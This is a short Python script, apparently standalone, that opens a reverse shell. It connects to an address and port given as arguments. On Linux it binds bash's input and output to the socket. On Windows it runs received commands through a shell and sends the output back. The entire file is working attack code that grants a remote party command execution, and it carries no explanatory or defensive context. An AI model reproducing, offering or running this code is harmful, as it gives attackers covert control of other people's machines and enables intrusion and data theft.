import socket, subprocess, os, sys, platform

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))

if platform.system() == 'Linux':
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  p=subprocess.run(['/bin/bash', '-i'])
elif platform.system() == 'Windows':
  while 1:
    s.send(str.encode(os.getcwd() + '> '))
    data = s.recv(1024).decode('UTF-8')
    data = data.strip('\n')
    if data == 'quit': 
      break
    if data[:2] == 'cd':
      os.chdir(data[3:])
    if len(data) > 0:
      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
      stdout_value = proc.stdout.read() + proc.stderr.read()
      output_str = str(stdout_value, 'UTF-8')
      s.send(str.encode("\n" + output_str))
